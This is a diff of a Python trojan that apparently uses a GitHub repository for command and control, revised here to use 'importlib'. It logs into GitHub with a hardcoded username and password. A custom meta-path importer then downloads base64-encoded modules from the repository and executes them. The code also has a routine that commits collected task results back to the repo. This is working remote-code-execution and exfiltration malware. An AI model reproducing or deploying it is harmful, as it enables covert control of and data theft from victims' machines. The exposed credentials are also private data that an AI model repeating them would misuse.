@@ -2,11 +2,15 @@ import json
 import base64
 import sys
 import time
-import imp
 import random
 import threading
 import queue
 import os
+import inspect
+from importlib import machinery
+from importlib.abc import InspectLoader
+import os
+import types
 
 
 from github3 import login
@@ -23,8 +27,9 @@ configured	= False
 class GitImporter(object):
 
 	def __init__(self):
-		self.current_module_code = ""
 
+		self.current_module_code = ""
+		
 	def find_module(self,fullname,path=None):
 		if configured:
 			print("[*] Attempting to retrieve %s" % fullname)
@@ -32,31 +37,33 @@ class GitImporter(object):
 
 			if new_library is not None:
 				self.current_module_code = base64.b64decode(new_library)
-				
-				print("end_find")
-				
 				return self
 
 		return None
 
 	def load_module(self,name):
 
-		print("[*] load %s" % name)
-
-		module = imp.new_module(name)
-
-		#exec(str(self.current_module_code in module.__dict__))
+		#tempfilename = name + "temp.py"
+		print(name)
+		#print(self.current_module_code)
+		#f = open(tempfilename,'w')
+		#f.write( self.current_module_code.decode('utf-8'))
+		#f.close()
 		
-		print(self.current_module_code.decode('utf-8'))
+		#loader = machinery.SourceFileLoader(name, tempfilename)
+		#module = loader.load_module()
 		
-		exec(self.current_module_code.decode('utf-8'))
-
+		module = types.ModuleType(name)
+		code = InspectLoader.source_to_code(self.current_module_code.decode('utf-8'))
+		
+		exec(code,module.__dict__)
+		
 		sys.modules[name] = module
 		
-		print("end_load")
+		#os.remove(tempfilename)
 
 		return module
-
+				
 def connect_to_github():
 	gh = login('toshihiko-kobayashi', password='tk47119599')
 	repo = gh.repository("toshihiko-kobayashi","chapter7")
@@ -77,8 +84,6 @@ def get_file_contents(filepath):
 
 			blob = repo.blob(filename._json_data['sha'])
 			
-			print(blob)
-			
 			return blob.content
 
 	return None
@@ -91,19 +96,13 @@ def get_trojan_config():
 	configured	= True
 
 	for task in config:
-
-		print("find_module")
-
+	
 		if task['module'] not in sys.modules:
 		
 			string = "import %s" % task['module']
-			
-			print("find_module_step2")
 		
-			exec(str(string))
+			exec(string)
 			
-			print("find_module_end")
-
 	return config
 
 def store_module_result(data):
@@ -112,7 +111,7 @@ def store_module_result(data):
 
 	remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
 
-	repo.create_file(remote_path,"Commit message",base64.b64encode(data))
+	repo.create_file(remote_path,"Commit message",data.encode('utf-8'))
 
 	return
 
@@ -120,11 +119,15 @@ def module_runner(module):
 	
 	task_queue.put(1)
 	
+	print(sys.modules[module])
+	#result = exec(sys.modules[module].run())
 	result = sys.modules[module].run()
 	task_queue.get()
 
 	# リポジトリに結果を保存する
-	store_module_result(result)
+	#store_module_result(result)
+	
+	#print(result)
 
 	return
 
@@ -133,7 +136,7 @@ def module_runner(module):
 
 print("start")
 
-sys.meta_path = [GitImporter()]
+sys.meta_path.append(GitImporter())
 
 print("metapath set")
 
